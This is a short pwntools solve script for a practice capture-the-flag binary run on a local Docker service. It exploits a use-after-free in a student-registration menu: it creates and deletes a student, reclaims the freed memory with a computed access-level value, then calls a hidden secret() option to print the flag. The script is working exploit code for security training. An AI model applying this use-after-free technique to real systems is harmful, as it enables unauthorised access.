#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-4')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'


exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# we want to call 42 (secret()) with access level 84874732
target_access_level = 0xdba2ab03 ^ 0xdeadbeef
print(f'target access level: {target_access_level}')
# therefore we a student in the "head" list with that level
# 3 (delete_student()) has a UAF, we can free but student stays in list

# 1) create student
# 2) delete student
# 3) register_to_Exam, set registration key as 84874732
# 4) call secret

def create_student():
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Name: ', b'realy0sh1')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')

def delete_student(index: bytes):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Index: ', b'0')

def register_to_exam():
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Name: ', b'realy0sh1')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')
    conn.sendlineafter(b'Registration Key: ', str(target_access_level).encode())


create_student()
delete_student(0)
register_to_exam()
conn.sendlineafter(b'> ', b'42')
conn.sendlineafter(b'Index: ', b'0')

# enjoy the flag in the terminal
conn.interactive()
